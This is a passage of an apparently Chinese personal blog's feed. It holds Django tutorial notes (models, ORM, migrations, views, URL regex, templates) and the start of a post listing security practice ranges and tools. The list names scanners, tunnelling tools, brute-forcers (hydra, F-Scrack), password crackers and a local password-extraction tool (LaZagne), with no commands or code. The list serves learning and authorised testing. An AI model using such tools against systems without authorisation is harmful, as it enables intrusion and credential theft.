&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;placeholder&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请输入密码&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;submit&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;提交&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;body&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;list.html&lt;&#x2F;p&gt;
&lt;p&gt;数据库设置&lt;&#x2F;p&gt;
&lt;p&gt;首先在settings.py中先注册app&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827170945361.png&quot; alt=&quot;image-20200827170945361&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;在mysql数据库中，通过命令 create database jianyidjango; 创建数据库&lt;&#x2F;p&gt;
&lt;p&gt;查看数据库的命令 show databases；&lt;&#x2F;p&gt;
&lt;p&gt;然后在settings.py设置数据库：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171011806.png&quot; alt=&quot;image-20200827171011806&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;数据库迁移&lt;&#x2F;p&gt;
&lt;p&gt;Python3 manage.py makemigrations&lt;&#x2F;p&gt;
&lt;p&gt;Python3 manage.py migrate&lt;&#x2F;p&gt;
&lt;p&gt;model配置&lt;&#x2F;p&gt;
&lt;p&gt;model里面配置的类，在数据库中会显示成数据表，类里面的变量是数据表中表项。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171102141.png&quot; alt=&quot;image-20200827171102141&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;实现查询、增加功能&lt;&#x2F;p&gt;
&lt;p&gt;views配置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171122413.png&quot; alt=&quot;image-20200827171122413&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171139018.png&quot; alt=&quot;image-20200827171139018&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;index.html设置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171155055.png&quot; alt=&quot;image-20200827171155055&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;list.html设置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171210319.png&quot; alt=&quot;image-20200827171210319&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;再次执行数据库迁移&lt;&#x2F;p&gt;
&lt;p&gt;Python3 manage.py makemigrations&lt;&#x2F;p&gt;
&lt;p&gt;Python3 manage.py migrate&lt;&#x2F;p&gt;
&lt;p&gt;然后在index页面添加用户，在list查看有没有效果&lt;&#x2F;p&gt;
&lt;p&gt;最后再设置一个删除页 delete.html&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171409871.png&quot; alt=&quot;image-20200827171409871&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;设置views.py&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171422081.png&quot; alt=&quot;image-20200827171422081&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;设置urls.py&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827171434711.png&quot; alt=&quot;image-20200827171434711&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;如果需要可以设置页面跳转效果&lt;&#x2F;p&gt;
&lt;p&gt;总结：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;所有的html文件都要放在templates目录下，默认是无法访问的&lt;&#x2F;li&gt;
&lt;li&gt;新的页面要被访问，必须编写views的视图函数，然后在urls做映射&lt;&#x2F;li&gt;
&lt;li&gt;页面之间的跳转，基于a链接来实现，href设置的时候通过模板变量{% url ‘welcome’%}&lt;&#x2F;li&gt;
&lt;li&gt;views中处理http请求的时候，可以通过HTTPResponse、render、HTTPResponseRedirct等方式来实现&lt;&#x2F;li&gt;
&lt;li&gt;在form表单中，通过模板变量{% csrf_token %}来保证安全性，生成随机数&lt;&#x2F;li&gt;
&lt;li&gt;通过数据库可以实现动态网站，网站内容随着后台数据库的改变而改变&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;ORM概述&lt;&#x2F;p&gt;
&lt;p&gt;什么是ORM？&lt;&#x2F;p&gt;
&lt;p&gt;Python是开发语言，数据可以MySQL采用的数据库语言，这两种语言之间如何实现互操作？&lt;&#x2F;p&gt;
&lt;p&gt;ORM&lt;&#x2F;p&gt;
&lt;p&gt;object relational mapping 对象关系映射&lt;&#x2F;p&gt;
&lt;p&gt;用于实现数据库和编程语言之间的映射，ORM就是将SQL操作和编程语言操作做了一个翻译。&lt;&#x2F;p&gt;
&lt;p&gt;通过ORM技术来操作数据库，使得开发者无需接触SQL语句，而是直接操作对象的属性和方法，大大提高开发效果。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image002.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;ORM功能&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image004.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;①  映射技术：每一张数据库表对应的是开发语言中的类，每一个数据字段，对应的是类中的属性&lt;&#x2F;p&gt;
&lt;p&gt;②  CRUD操作：即增删查改操作，在SQL语句中通过insert select update delete来实现，在djangoORM中通过get filter save delete方法（函数）来实现&lt;&#x2F;p&gt;
&lt;p&gt;③  缓存优化：从数据库查询到的数据以类形式保存在内存中，用于随时提取。&lt;&#x2F;p&gt;
&lt;p&gt;真正需要查询结果时才执行数据库的select操作，而不是在ORM查询命令执行时就查询数据库&lt;&#x2F;p&gt;
&lt;p&gt;有哪些ORM技术？&lt;&#x2F;p&gt;
&lt;p&gt;不同的后端语言都有自己的ORM，django的orm叫DjangoORM，通过创建model类和定义field字段来实现&lt;&#x2F;p&gt;
&lt;p&gt;model创建语法&lt;&#x2F;p&gt;
&lt;p&gt;先导入模块&lt;&#x2F;p&gt;
&lt;p&gt;from Django.db import models&lt;&#x2F;p&gt;
&lt;p&gt;class Modelname(models.Model): #创建类并继承models.Model&lt;&#x2F;p&gt;
&lt;p&gt;​    #通过models.XXXField创建field字段&lt;&#x2F;p&gt;
&lt;p&gt;​    field1=models.XXXField(verbose_name=’xxx’,max_length=xxx)&lt;&#x2F;p&gt;
&lt;p&gt;​    #定义子类，为父类添加说明&lt;&#x2F;p&gt;
&lt;p&gt;​    class Meta:&lt;&#x2F;p&gt;
&lt;p&gt;​       verbose_name=xxx&lt;&#x2F;p&gt;
&lt;p&gt;​       verbose_name_plural=xxx&lt;&#x2F;p&gt;
&lt;p&gt;属性及字段&lt;&#x2F;p&gt;
&lt;p&gt;Field类型&lt;&#x2F;p&gt;
&lt;p&gt;AutoField：一个自动递增的整型字段，添加记录时它会自动增长，通常用于数据表的主键&lt;&#x2F;p&gt;
&lt;p&gt;CharField：字符串字段，用于输入较短的字符&lt;&#x2F;p&gt;
&lt;p&gt;TextField：文本字段&lt;&#x2F;p&gt;
&lt;p&gt;EmailField：邮箱字段，用于输入带有email格式的字符&lt;&#x2F;p&gt;
&lt;p&gt;DateTimeField：日期字段，支持时间输入&lt;&#x2F;p&gt;
&lt;p&gt;ImageField：用于上传图片并验证图片的合法性，必须定义upload_to参数&lt;&#x2F;p&gt;
&lt;p&gt;IntergerField：整数字段&lt;&#x2F;p&gt;
&lt;p&gt;每个表都应该有一个主键，并且只能有一个。主键有两个作用，一是约束作用，用来规范一个存储主键和唯一性，同时也在此键上建立了一个主键索引；&lt;&#x2F;p&gt;
&lt;p&gt;主键的约束作用：&lt;&#x2F;p&gt;
&lt;p&gt;唯一标识数据库表中的每条记录&lt;&#x2F;p&gt;
&lt;p&gt;必须包含唯一值&lt;&#x2F;p&gt;
&lt;p&gt;主键列不能包含null值&lt;&#x2F;p&gt;
&lt;p&gt;Field属性：&lt;&#x2F;p&gt;
&lt;p&gt;primary_key：定义此字段是否为主键 True or False&lt;&#x2F;p&gt;
&lt;p&gt;default：设置默认值&lt;&#x2F;p&gt;
&lt;p&gt;null：是否容许数据库字段为Null，默认是False&lt;&#x2F;p&gt;
&lt;p&gt;blank：是否容许用户不输入，默认false&lt;&#x2F;p&gt;
&lt;p&gt;choices：设置该字段的可选值&lt;&#x2F;p&gt;
&lt;p&gt;max_length：一般在文本字段来设置&lt;&#x2F;p&gt;
&lt;p&gt;verbose_name：设置字段的别名，所有字段都可以设置&lt;&#x2F;p&gt;
&lt;p&gt;upload_to：设置上传路径，ImageField和FileField需要设置此参数&lt;&#x2F;p&gt;
&lt;p&gt;Meta类属性&lt;&#x2F;p&gt;
&lt;p&gt;verbose_name：设置对象名称，如果没有设置，则默认为该类名的小写分词形式&lt;&#x2F;p&gt;
&lt;p&gt;UserCMS 会被转换为 user cms&lt;&#x2F;p&gt;
&lt;p&gt;verbose_name_plural 设置对象名称的复数，一般设置成和verbose_name一样，否则会默认加s&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image006.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;数据同步&lt;&#x2F;p&gt;
&lt;p&gt;全局同步&lt;&#x2F;p&gt;
&lt;p&gt;makemigrations 生成数据库表初始化文件initial.py&lt;&#x2F;p&gt;
&lt;p&gt;migrate 基于initial.py正式生成数据表&lt;&#x2F;p&gt;
&lt;p&gt;部分同步&lt;&#x2F;p&gt;
&lt;p&gt;makemigrations jianyidjango&lt;&#x2F;p&gt;
&lt;p&gt;Model操作&lt;&#x2F;p&gt;
&lt;p&gt;查询&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.all() 查询类的所有数据&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.filter() 返回符合筛选条件的数据集（一个或者多个对象）&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.get() 返回符合筛选条件的数据（一个对象）&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.exclude() 返回不符合筛选条件的数据&lt;&#x2F;p&gt;
&lt;p&gt;增加&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.save()&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.create()&lt;&#x2F;p&gt;
&lt;p&gt;删除&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.all().delete() 查询所有对象并删除&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.filter().delete()&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.get().delete()&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.exclude().delete()&lt;&#x2F;p&gt;
&lt;p&gt;排序&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.all().order_by(‘xxx’) 查询类中的所有对象并根据关键词排序&lt;&#x2F;p&gt;
&lt;p&gt;切片&lt;&#x2F;p&gt;
&lt;p&gt;ModelName.Objects.all().order_by(‘xxx’)[a:b]&lt;&#x2F;p&gt;
&lt;p&gt;Admin（后台管理）&lt;&#x2F;p&gt;
&lt;p&gt;创建并注册模型管理类&lt;&#x2F;p&gt;
&lt;p&gt;进入admin.py文件，将models编写的类导入&lt;&#x2F;p&gt;
&lt;p&gt;继承admin.ModelAdmin,创建管理类&lt;&#x2F;p&gt;
&lt;p&gt;将类与管理类注册到admin&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image008.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;创建admin超级用户&lt;&#x2F;p&gt;
&lt;p&gt;python3 manage.py createsuperuser&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image010.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;登录后台管理平台&lt;&#x2F;p&gt;
&lt;p&gt;在settings.py设置admin后台管理语言为中文&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image011.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Views视图&lt;&#x2F;p&gt;
&lt;p&gt;views视图用于负责整个业务逻辑处理，包括从http请求到回应的过程&lt;&#x2F;p&gt;
&lt;p&gt;功能&lt;&#x2F;p&gt;
&lt;p&gt;根据收到的http Request，执行URL映射&lt;&#x2F;p&gt;
&lt;p&gt;根据url映射调用视图函数，调用models数据&lt;&#x2F;p&gt;
&lt;p&gt;渲染Templates网页文件并返回HTTP Response&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image013.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;URL映射&lt;&#x2F;p&gt;
&lt;p&gt;每个Django项目至少有一个urls.py文件，该文件用于存储URL与视图函数的映射关系&lt;&#x2F;p&gt;
&lt;p&gt;url解析过程由django.conf.urls里面的url模块来实现的&lt;&#x2F;p&gt;
&lt;p&gt;url映射基于正则表达式来实现&lt;&#x2F;p&gt;
&lt;p&gt;正则表达式&lt;&#x2F;p&gt;
&lt;p&gt;^:以xxx开头，比如^admin &lt;&#x2F;p&gt;
&lt;p&gt;$:以xxx结尾，比如admin$&lt;&#x2F;p&gt;
&lt;p&gt;x|y：匹配x或者y，比如request|reply&lt;&#x2F;p&gt;
&lt;p&gt;[xyz]：匹配所包含的任意一个字符&lt;&#x2F;p&gt;
&lt;p&gt;[^xyz]: 匹配未包含的任意一个字符&lt;&#x2F;p&gt;
&lt;p&gt;[-]:匹配字符或者数字范围 [a-z],[0-9]&lt;&#x2F;p&gt;
&lt;p&gt;{n}：匹配n次 [0-9]{4}&lt;&#x2F;p&gt;
&lt;p&gt;\w:匹配包括下划线的任意单词字符等价于[a-zA-Z0-9]&lt;&#x2F;p&gt;
&lt;p&gt;\W:匹配包括非单词字符,等价于&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#a-zA-Z0-9&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
&lt;p&gt;\d:匹配一个数字字符&lt;&#x2F;p&gt;
&lt;p&gt;\d+：匹配一个或多个数字字符&lt;&#x2F;p&gt;
&lt;p&gt;\D：匹配一个非数字字符&lt;&#x2F;p&gt;
&lt;p&gt;在django 2.x.x版本中，如果要使用正则表达式的话，要使用函数re_path()&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image015.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;URL映射分类&lt;&#x2F;p&gt;
&lt;p&gt;反向URL映射（命名）&lt;&#x2F;p&gt;
&lt;p&gt;通过name属性为url映射条目设置名称，可以在templates和views处理中，解析到对应的view函数&lt;&#x2F;p&gt;
&lt;p&gt;在templates模板文件中，通过{% url 变量名 %}设置URL映射，然后解析到对应的view函数&lt;&#x2F;p&gt;
&lt;p&gt;在views配置中，通过reverse、render等方法来映射到对应的views函数&lt;&#x2F;p&gt;
&lt;p&gt;带命名参数的URL映射&lt;&#x2F;p&gt;
&lt;p&gt;分布式URL映射（一般用于大型项目中）&lt;&#x2F;p&gt;
&lt;p&gt;视图函数&lt;&#x2F;p&gt;
&lt;p&gt;当用户发起http Request到web服务器时，django执行url映射之后，接下来的任务就交给视图函数来处理&lt;&#x2F;p&gt;
&lt;p&gt;视图函数可以调用models的数据（可选）,并渲染templates网页文件，最终返回给用户&lt;&#x2F;p&gt;
&lt;p&gt;视图函数可以通过下面的方式来处理用户请求，并返回HTTPResponse&lt;&#x2F;p&gt;
&lt;p&gt;render 返回html文件并传递参数&lt;&#x2F;p&gt;
&lt;p&gt;HTTPResponse 直接返回内容&lt;&#x2F;p&gt;
&lt;p&gt;HTTPResponseRedirect 重定向到另外的页面 302&lt;&#x2F;p&gt;
&lt;p&gt;HTTPResponseNotFound 返回404&lt;&#x2F;p&gt;
&lt;p&gt;HTTPResponseServerError 返回500&lt;&#x2F;p&gt;
&lt;p&gt;视图函数写法分为基于函数的和基于类的&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image017.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;View类继承自django自带的基类base.View,自带get和postt方法，直接在此基础上重构即可&lt;&#x2F;p&gt;
&lt;p&gt;View类相比函数可以封装更多的方法，方便后期继承和拓展，实现更加复杂的功能&lt;&#x2F;p&gt;
&lt;p&gt;templates模块&lt;&#x2F;p&gt;
&lt;p&gt;templates负责整个表现逻辑，通过内置的模板语言结合html文件，为用户呈现web内容；&lt;&#x2F;p&gt;
&lt;p&gt;templates模板系统是一个独立的语言库，除了与HTML文件结合，也可以与其他文本格式的文档结合，甚至可以独立运行&lt;&#x2F;p&gt;
&lt;p&gt;templates模板系统通过模板标签、过滤器、流程控制、模板继承等方式，实现了web页面的动态展现&lt;&#x2F;p&gt;
&lt;p&gt;逻辑标签&lt;&#x2F;p&gt;
&lt;p&gt;{% if %} 用于实现逻辑判断&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;{% if request.user %}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;div class=’top1’&amp;gt;&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;{% else %}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;div class=’top2’&amp;gt;&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;{% endif %}&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;{% for %}用于实现循环&#x2F;遍历&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image019.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;模板变量&lt;&#x2F;p&gt;
&lt;p&gt;{{ }}&lt;&#x2F;p&gt;
&lt;p&gt;用于存储模板变量，变量内容可以直接从views函数获取，也可以通过if&#x2F;for标签来获取&lt;&#x2F;p&gt;
&lt;p&gt;通过模板变量，可以实现网页内容的动态展现&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image021.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image022.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;{% url ‘url_name’%}&lt;&#x2F;p&gt;
&lt;p&gt;跳转到特定url映射的模板变量，变量内容用url_name决定的&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image024.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;过滤器&lt;&#x2F;p&gt;
&lt;p&gt;就在变量后面加上管道符合过滤关键字，可以对模板内容实现进一步的过滤&lt;&#x2F;p&gt;
&lt;p&gt;slice&lt;&#x2F;p&gt;
&lt;p&gt;length&lt;&#x2F;p&gt;
&lt;p&gt;add&lt;&#x2F;p&gt;
&lt;p&gt;upper&lt;&#x2F;p&gt;
&lt;p&gt;lower&lt;&#x2F;p&gt;
&lt;p&gt;date&lt;&#x2F;p&gt;
&lt;p&gt;title&lt;&#x2F;p&gt;
&lt;p&gt;{{ name | upper}}&lt;&#x2F;p&gt;
&lt;p&gt;模板继承&lt;&#x2F;p&gt;
&lt;p&gt;属于templates高级功能，通过模板继承能最大程度的减少代码量&lt;&#x2F;p&gt;
&lt;p&gt;当网站的很多页面，header footer aside 等html组件非常类似甚至完全一样，只有少量的组件有差别时，可以采用模板继承&lt;&#x2F;p&gt;
&lt;p&gt;{% block block_name %}可替代内容{% endblock %}&lt;&#x2F;p&gt;
&lt;p&gt;{% extends ‘welcome.html’%} 继承语法&lt;&#x2F;p&gt;
&lt;p&gt;模板调用&lt;&#x2F;p&gt;
&lt;p&gt;html文件放在jianyidjango项目的根目录templates下&lt;&#x2F;p&gt;
&lt;p&gt;setting配置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image002-1598685360641.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;css&#x2F;js&#x2F;img文件&lt;&#x2F;p&gt;
&lt;p&gt;jianyidjango下新建一个static目录，将这些文件放在static目录下&lt;&#x2F;p&gt;
&lt;p&gt;然后在setting设置static路径&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image004-1598685360642.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;templates配置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200829151616005.png&quot; alt=&quot;image-20200829151616005&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>各种工具</title>
		<published>2020-08-31T00:00:00+00:00</published>
		<updated>2020-08-31T00:00:00+00:00</updated>
		<link href="https://baz.ee/ge-chong-gong-ju/" type="text/html"/>
		<id>https://baz.ee/ge-chong-gong-ju/</id>
		<content type="html">&lt;p&gt;win自带的虚拟环境wsl2&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;img src=&quot;images&#x2F;各种工具&#x2F;cb0987a549698f5daf12a2666b12dd3.png&quot; alt=&quot;cb0987a549698f5daf12a2666b12dd3&quot; style=&quot;zoom: 50%;&quot; &#x2F;&gt;
&lt;img src=&quot;images&#x2F;各种工具&#x2F;e793c5c86efad1366e5ffc339308bb8.png&quot; alt=&quot;e793c5c86efad1366e5ffc339308bb8&quot; style=&quot;zoom: 50%;&quot; &#x2F;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;rss订阅器：&lt;&#x2F;p&gt;
&lt;p&gt;quiteRSS&lt;&#x2F;p&gt;
&lt;p&gt;irreader&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;19580096&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;社区：&lt;&#x2F;p&gt;
&lt;p&gt;freebuf&lt;&#x2F;p&gt;
&lt;p&gt;看雪&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;导航站：&lt;&#x2F;p&gt;
&lt;p&gt;Google：安全导航站&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;靶场：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;Medicean&#x2F;VulApps
https:&#x2F;&#x2F;github.com&#x2F;710leo&#x2F;ZVulDrill
dvwa 靶场
https:&#x2F;&#x2F;github.com&#x2F;RandomStorm&#x2F;DVWA
webgoat 靶场
https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;安全工具&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;nmap&lt;&#x2F;strong&gt; 端口扫描工具&lt;&#x2F;p&gt;
&lt;p&gt;masscan_to_nmap&lt;&#x2F;p&gt;
&lt;p&gt;leprechaun 通过netstat显示拓补结构&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;wireshark&lt;&#x2F;strong&gt; 网络分析&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;tcpdump&lt;&#x2F;strong&gt; 网络嗅探&lt;&#x2F;p&gt;
&lt;p&gt;mitmproxy 代理&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;burpsuite&lt;&#x2F;strong&gt; 代理&lt;&#x2F;p&gt;
&lt;p&gt;综合扫描器：&lt;&#x2F;p&gt;
&lt;p&gt;appscan 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;nessus&lt;&#x2F;strong&gt; 扫描器 —– 扫描系统漏洞&lt;&#x2F;p&gt;
&lt;p&gt;nexpose 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;nikto 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;w3af 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;openvas 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;awvs 扫描器&lt;&#x2F;p&gt;
&lt;p&gt;【问】nmap,burpsuit,nessus这些扫描器之间有什么区别？&lt;&#x2F;p&gt;
&lt;p&gt;【答】&lt;&#x2F;p&gt;
&lt;p&gt;​			CMS Exploit Scan cms扫描
​					wpscan wordpress扫描
​					F-MiddlewareScan 中间件漏洞扫描
​					WeblogicScan weblogic漏洞扫描&lt;&#x2F;p&gt;
&lt;p&gt;【问】常见的web应用框架有哪些？&lt;&#x2F;p&gt;
&lt;p&gt;【答】Django、Flask、Struts2&lt;&#x2F;p&gt;
&lt;p&gt;【问】列出常见的5种cms&lt;&#x2F;p&gt;
&lt;p&gt;【答】&lt;&#x2F;p&gt;
&lt;p&gt;域名
子域名&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;subDomainsBrute
https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r&lt;&#x2F;p&gt;
&lt;p&gt;隧道技术：&lt;&#x2F;p&gt;
&lt;p&gt;frp 内网穿透
ngrok 内网转发
nps 内网穿透
openvpn 虚拟隧道
ptunnel-ng icmp 隧道
netcat 网络工具
hping 自定义发包器
sqlmap 注入工具
BeEF 浏览器开发框架
dirbuster 目录扫描工具
fdsploit 文件包含模糊测试工具
filegps 文件上传路径测试
ssrfmap ssrf 工具
dotdotpwn 目录遍历
xssniper xss 工具
John the Ripper 密码破解工具
https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagne 本地密码提取工具
hydra 爆破攻击工具
DBScanner 自动扫描内网中一些存在未授权访问的数据库，爆破
F-Scrack 针对FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL 爆破
